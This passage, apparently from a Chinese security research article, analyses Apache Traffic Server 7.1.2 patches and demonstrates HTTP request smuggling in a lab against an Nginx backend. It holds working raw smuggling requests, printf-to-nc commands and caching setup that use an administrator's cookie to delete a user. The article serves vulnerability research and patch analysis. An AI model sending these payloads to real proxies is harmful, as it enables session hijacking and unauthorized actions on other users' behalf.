构造数据包
    GET / HTTP/1.1\r\n
    Host: lnmp.mengsec.com\r\n
    Content-Length : 78\r\n
    \r\n
    GET /admin.php?del=mengchen HTTP/1.1\r\n
    Host: lnmp.mengsec.com\r\n
    attack: 1\r\n
    foo: 
然后是管理员的正常请求
    GET / HTTP/1.1
    Host: lnmp.mengsec.com
    Cookie: admin=1
让我们看一下效果如何。
在Wireshark的数据包中看的很直观，阴影部分为管理员发送的正常请求。
在Nginx服务器上拼接到了上一个请求中， 成功删除了用户mengchen。
#### 4.3.2 第二个补丁
>  # 3201 当返回400错误时，关闭连接
这个补丁说明了，在ATS
7.1.2中，如果请求导致了400错误，建立的TCP链接也不会关闭。在regilero的对CVE-2018-8004的分析[文章](https://regilero.github.io/english/security/2019/10/17/security_apache_traffic_server_http_smuggling/)中，说明了如何利用这个漏洞进行攻击。
    printf 'GET / HTTP/1.1\r\n'\
    'Host: ats.mengsec.com\r\n'\
    'aa: \0bb\r\n'\
    'foo: bar\r\n'\
    'GET /2333 HTTP/1.1\r\n'\
    'Host: ats.mengsec.com\r\n'\
    '\r\n'\
    | nc 10.211.55.22 80
一共能够获得2个响应，都是400错误。
ATS在解析HTTP请求时，如果遇到`NULL`，会导致一个截断操作，我们发送的这一个请求，对于ATS服务器来说，算是两个请求。
第一个
    GET / HTTP/1.1\r\n
    Host: ats.mengsec.com\r\n
    aa: 
第二个
    bb\r\n
    foo: bar\r\n
    GET /2333 HTTP/1.1\r\n
    Host: ats.mengsec.com\r\n
    \r\n
第一个请求在解析的时候遇到了`NULL`，ATS服务器响应了第一个400错误，后面的`bb\r\n`成了后面请求的开头，不符合HTTP请求的规范，这就响应了第二个400错误。
再进行修改下进行测试
    printf 'GET / HTTP/1.1\r\n'\
    'Host: ats.mengsec.com\r\n'\
    'aa: \0bb\r\n'\
    'GET /1.html HTTP/1.1\r\n'\
    'Host: ats.mengsec.com\r\n'\
    '\r\n'\
    | nc 10.211.55.22 80
一个400响应，一个200响应，在Wireshark中也能看到，ATS把第二个请求转发给了后端Apache服务器。
那么由此就已经算是一个HTTP请求拆分攻击了，
    GET / HTTP/1.1\r\n
    Host: ats.mengsec.com\r\n
    aa: \0bb\r\n
    GET /1.html HTTP/1.1\r\n
    Host: ats.mengsec.com\r\n
    \r\n
但是这个请求包，怎么看都是两个请求，中间的`GET /1.html
HTTP/1.1\r\n`不符合HTTP数据包中请求头`Name:Value`的格式。在这里我们可以使用`absoluteURI`，在`RFC2616`中第`5.1.2`节中规定了它的详细格式。
> 
我们可以使用类似`GET http://www.w3.org/pub/WWW/TheProject.html HTTP/1.1`的请求头进行请求。
构造数据包
    GET /400 HTTP/1.1\r\n
    Host: ats.mengsec.com\r\n
    aa: \0bb\r\n
    GET http://ats.mengsec.com/1.html HTTP/1.1\r\n
    \r\n
    GET /404 HTTP/1.1\r\n
    Host: ats.mengsec.com\r\n
    \r\n
    printf 'GET /400 HTTP/1.1\r\n'\
    'Host: ats.mengsec.com\r\n'\
    'aa: \0bb\r\n'\
    'GET http://ats.mengsec.com/1.html HTTP/1.1\r\n'\
    '\r\n'\
    'GET /404 HTTP/1.1\r\n'\
    'Host: ats.mengsec.com\r\n'\
    '\r\n'\
    | nc 10.211.55.22 80
本质上来说，这是两个HTTP请求，第一个为
    GET /400 HTTP/1.1\r\n
    Host: ats.mengsec.com\r\n
    aa: \0bb\r\n
    GET http://ats.mengsec.com/1.html HTTP/1.1\r\n
    \r\n
其中`GET http://ats.mengsec.com/1.html HTTP/1.1`为名为`GET
http`，值为`//ats.mengsec.com/1.html HTTP/1.1`的请求头。
第二个为
    GET /404 HTTP/1.1\r\n
    Host: ats.mengsec.com\r\n
    \r\n
当该请求发送给ATS服务器之后，我们可以获取到三个HTTP响应，第一个为400，第二个为200，第三个为404。多出来的那个响应就是ATS中间对服务器1.html的请求的响应。
根据HTTP
Pipepline的先入先出规则，假设攻击者向ATS服务器发送了第一个恶意请求，然后受害者向ATS服务器发送了一个正常的请求，受害者获取到的响应，就会是攻击者发送的恶意请求中的`GET
http://evil.mengsec.com/evil.html HTTP/1.1`中的内容。这种攻击方式理论上是可以成功的，但是利用条件还是太苛刻了。
对于该漏洞的修复方式，ATS服务器选择了，当遇到400错误时，关闭TCP链接，这样无论后续有什么请求，都不会对其他用户造成影响了。
#### 4.3.3 第三个补丁
>  # 3231 验证请求中的Content-> Length头
在该补丁中，bryancall 的描述是
    当Content-Length请求头不匹配时，响应400，删除具有相同Content-Length请求头的重复副本，如果存在Transfer-Encoding请求头，则删除Content-Length请求头。
从这里我们可以知道，ATS 7.1.2版本中，并没有对`RFC2616`的标准进行完全实现，我们或许可以进行`CL-TE`走私攻击。
构造请求
    GET / HTTP/1.1\r\n
    Host: lnmp.mengsec.com\r\n
    Content-Length: 6\r\n
    Transfer-Encoding: chunked\r\n
    \r\n
    0\r\n
    \r\n
    G
多次发送后就能获得`405 Not Allowed`响应。
我们可以认为，后续的多个请求在Nginx服务器上被组合成了类似如下所示的请求。
    GGET / HTTP/1.1\r\n
    Host: lnmp.mengsec.com\r\n
    ......
对于Nginx来说，`GGET`这种请求方法是不存在的，当然会返回`405`报错了。
接下来尝试攻击下`admin.php`，构造请求
    GET / HTTP/1.1\r\n
    Host: lnmp.mengsec.com\r\n
    Content-Length: 83\r\n
    Transfer-Encoding: chunked\r\n
    \r\n
    0\r\n
    \r\n
    GET /admin.php?del=mengchen HTTP/1.1\r\n
    Host: lnmp.mengsec.com\r\n
    attack: 1\r\n
    foo: 
多次请求后获得了响应`You are not Admin`，说明服务器对`admin.php`进行了请求。
如果此时管理员已经登录了，然后想要访问一下网站的主页。他的请求为
    GET / HTTP/1.1
    Host: lnmp.mengsec.com
    Cookie: admin=1
效果如下
我们可以看一下Wireshark的流量，其实还是很好理解的。
阴影所示部分就是管理员发送的请求，在Nginx服务器中组合进入了上一个请求中，就相当于
    GET /admin.php?del=mengchen HTTP/1.1
    Host: lnmp.mengsec.com
    attack: 1
    foo: GET / HTTP/1.1
    Host: 10.211.55.2:10086
    Cookie: admin=1
    X-Forwarded-For: 10.211.55.2
    Via: http/1.1 mengchen-ubuntu[e9365059-ad97-40c8-afcb-d857b14675f6] (ApacheTrafficServer/7.1.2)
携带着管理员的Cookie进行了删除用户的操作。这个与前面4.3.1中的利用方式在某种意义上其实是相同的。
#### 4.3.4 第四个补丁
>  # 3251 当缓存命中时，清空请求体
当时看这个补丁时，感觉是一脸懵逼，只知道应该和缓存有关，但一直想不到哪里会出问题。看代码也没找到，在9月17号的时候regilero的分析文章出来才知道问题在哪。
当缓存命中之后，ATS服务器会忽略请求中的`Content-Length`请求头，此时请求体中的数据会被ATS当做另外的HTTP请求来处理，这就导致了一个非常容易利用的请求走私漏洞。
在进行测试之前，把测试环境中ATS服务器的缓存功能打开，对默认配置进行一下修改，方便我们进行测试。
    vim /opt/ts-712/etc/trafficserver/records.config
    CONFIG proxy.config.http.cache.http INT 1 # 开启缓存功能
    CONFIG proxy.config.http.cache.ignore_client_cc_max_age INT 0 # 使客户端Cache-Control头生效，方便控制缓存过期时间
    CONFIG proxy.config.http.cache.required_headers INT 1 # 当收到Cache-control: max-age 请求头时，就对响应进行缓存
然后重启服务器即可生效。
为了方便测试，我在Nginx网站目录下写了一个生成随机字符串的脚本`random_str.php`
    function randomkeys($length){ 
        $output='';
        for ($a = 0; $a<$length; $a++) {
            $output .= chr(mt_rand(33, 126));
        }   
        return $output;